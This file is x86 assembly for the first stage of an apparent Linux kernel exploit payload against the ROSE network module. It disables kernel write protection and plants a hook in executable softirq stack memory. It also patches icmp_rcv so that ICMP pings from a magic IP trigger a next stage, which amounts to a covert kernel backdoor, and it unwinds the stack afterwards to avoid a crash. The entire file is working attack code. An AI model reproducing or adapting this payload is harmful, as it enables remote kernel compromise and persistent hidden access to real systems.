.intel_syntax noprefix

.globl softirq_start
.globl softirq_end

#include "payload.h"

.set PROCESS_LEN,0x280
.set PROCESS_MAGIC,0xfeedface
.set ROSE,0x65736f72	# "rose" in hex

.set HOOK_MAGIC,0xdeadeffe
.set HOOK_LEN,0x280

.macro disable_wp
	mov eax,cr0
	and eax,0xfffeffff
	mov cr0,eax	
.endm

.macro enable_wp
	mov eax,cr0
	or eax,0x10000
	mov cr0,eax
.endm

.text

softirq_start:

# Adjust the preempt count.  This isn't strictly needed since __do_softirq()
# will reset the preemption count on return from the softirq handler on
# mismatch, but this avoids a noisy printk.
	mov eax,esp
	and ax,0xe000
	# decrement the preemption count
	sub BYTE PTR [eax+0x15],0x2

#ifdef PAE
# Mark an extra page of the softirq stack executable
	mov edx,0x2
	mov ebx,SET_MEMORY_X
	call ebx
#endif

# Copy our hook into our landing zone.  We use the page
# boundary of the softirq stack, since we've already marked it executable if
# needed.
	call geteip
geteip:
	pop esi
	add esi,0x20	# Otherwise we'll just hit the one right here :p
scan:
	inc esi
	cmp DWORD PTR [esi],HOOK_MAGIC
	jne scan

	add esi,4
	mov edi,esp
	and di,0xf000
	mov ecx,HOOK_LEN
	cld
	rep movsb

# Copy our hook into the landing zone.
	sub esi,HOOK_LEN
scan2:
	inc esi
	cmp DWORD PTR [esi],PROCESS_MAGIC
	jne scan2

	add esi,4
	and di,0xf000
	sub edi,0x400
	mov ecx,PROCESS_LEN
	cld
	rep movsb
# We need to find and release the two ROSE spinlocks or we'll deadlock.  The
# problem is, since we've had to call set_memory_x(), there's no longer a
# reference to anything in the ROSE module on the softirq stack anymore.  This
# means we have to search memory in some way for the locks.
#
# I hardcode the address of the modules list, walk the linked list, find the
# base of the ROSE module, and scan its .data section for a byte signature

# TODO: find modules list at runtime
	mov ebx,MODULES

find_rose:
	mov ebx,[ebx]
	cmp DWORD PTR [ebx+8],ROSE
	jne find_rose
	mov esi,DWORD PTR [ebx+0xd8]

# TODO: more flexible byte pattern signature for spinlocks
search:
	inc esi
	inc esi
	inc esi
	inc esi
	mov ebx,DWORD PTR [esi]
	cmp ebx,0x201
	jne search
	mov ebx,DWORD PTR [esi+4]
	cmp ebx,0x504
	jne search

	inc BYTE PTR [esi]
	inc BYTE PTR [esi+4]


# Next, we hook the icmp_rcv function to trigger our next stage on receiving
# an ICMP echo request from our magic IP.
	
	# Get original address
	mov ebx,DWORD PTR [INET_PROTOS+4]
	mov ebx,DWORD PTR [ebx]
	mov eax,DWORD PTR [ebx]
	add edi,0x800
	and di,0xf000
	mov DWORD PTR [edi-4],eax

	disable_wp
	mov DWORD PTR [ebx],edi
	enable_wp

	# Finally, we unwind the stack to restore to the stack frame for
	# netif_receive_skb() and return from the softirq

	# Fingerprint: two consecutive pointers, one 4 bytes greater than
	# the other
unwind:
	add esp,4
	mov eax,DWORD PTR [esp+8]
	mov ebx,DWORD PTR [esp+4]
	add ebx,4
	cmp eax,ebx
	jne unwind

	# Return from our function
	pop ebx
	pop esi
	pop edi
	pop ebp
	ret
	
	.long HOOK_MAGIC
softirq_end:
